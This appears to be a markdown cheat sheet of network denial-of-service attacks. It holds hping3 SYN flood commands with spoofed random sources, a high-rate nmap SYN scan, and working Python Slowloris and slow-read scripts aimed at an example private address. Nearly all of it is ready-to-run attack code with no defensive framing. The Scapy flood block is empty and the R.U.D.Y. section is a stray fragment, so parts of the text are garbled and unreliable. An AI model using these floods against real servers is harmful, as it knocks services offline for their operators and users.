## Network Layer DoS

### SYN Flood

hping3 -S --flood --rand-source -p 80 192.168.1.100                    # Spoofed source
hping3 -c 1000000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.100
nmap -sS --max-rate 10000 -p 80 192.168.1.100                          # High rate SYN

# Scapy SYN flood
python3 << 'EOF'

EOF

# Python Slowloris
python3 << 'EOF'
import socket
import time
import random

target = "192.168.1.100"
port = 80
sockets = []

for i in range(500):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
        sockets.append(s)
    except:
        pass

while True:
    for s in sockets:
        try:
            s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
        except:
            sockets.remove(s)
    time.sleep(15)
EOF

### R.U.D.Y (Slow POST)

    s.send(b"X")
    time.sleep(0.1)
EOF

### Slowread Attack
# Keep connection open by reading slowly
python3 << 'EOF'
import socket
import time
target = "192.168.1.100"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, 80))
s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
while True:
    s.recv(1)  # Read 1 byte at a time
    time.sleep(5)
EOF
